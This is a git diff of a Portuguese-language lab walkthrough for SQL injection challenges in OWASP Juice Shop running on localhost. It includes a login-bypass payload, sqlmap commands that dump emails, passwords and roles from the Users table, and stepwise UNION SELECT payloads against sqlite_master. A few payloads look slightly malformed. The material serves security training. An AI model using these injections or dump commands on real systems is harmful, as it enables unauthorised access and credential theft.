@@ -139,16 +139,23 @@ A injeção pode resultar em perda ou corrupção de dados, divulgação a parte
 Faça login de usuários via injeção SQL 
 
             E-mail: ' OR 1=1 --
-            E-mail = user@dom.net‘ --
+            E-mail = user@dom.net' --
             Senha: qualquer
 
-- [ ] Obtenha o Schema do banco de dados SQL (Dica: sqlmap).
-
-Payloads Database Schema
-
-Utilizando o ZAP (Open/Resend) no campo de pesquisa de produtos do juice-shop 
+- [ ] Obtenha o Schema do banco de dados SQL (Dica: sqlmap, método Union).
 ```
-orange'))--
+sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite --level=3 --risk=3 --technique=U --threads=4 --schema --no-cast --ignore-code=500
+```
+```
+sqlmap -u "http://localhost:3000/rest/products/search?q=q" --dbms=sqlite -D SQLite_masterdb -T Users -C email,password,role --dump --threads=4 --no-cast --ignore-code=500
+```
+Payloads Schema Database baseados em operador SQL Union.
+
+Usa o operador UNION do SQL para juntar o resultado da busca original do site com os dados obtidos pelo invasor.
+
+Utilize o ZAP (Open/Resend) no campo de pesquisa de produtos do juice-shop.
+```
+orange')) UNION SELECT * FROM sql --
 ```
 Consulte https://www.sqlite.org/faq.html no item "(7) How do I list all tables/indices contained in an SQLite database" (Como listo todas as tabelas/índices contidos em um banco de dados SQLite), que o esquema é armazenado em uma tabela do sistema chamada (sqlite_master).
 ```
@@ -160,17 +167,17 @@ orange')) UNION SELECT 1 FROM sqlite_master --
 ```
 orange')) UNION SELECT 1,2 FROM sqlite_master --
 ``` 
-Repetir até receber uma resposta JSON de sucesso
+Repetir até receber uma resposta JSON de sucesso.
 ``` 
 orange')) UNION SELECT 1,2,3,4,5,6,7,8,9 FROM sqlite_master --
 ```
-O último passo é substituir o primeiro valor "1" pelo nome correto da coluna "sql"
+O último passo é substituir o primeiro valor "1" pelo nome correto da coluna "sql".
 ``` 
 orange')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master –
 ```
-Procure no código JSON por CREATE TABLE `Users`
+Procure no código JSON por CREATE TABLE Users.
 
-Acrescente os campos importantes para extração dos dados e complete com os números da colunas
+Acrescente os campos importantes para extração dos dados e complete com os números da colunas.
 ```
 orange')) UNION SELECT id,username,email,password,role,6,7,8,9 FROM users --
 ```
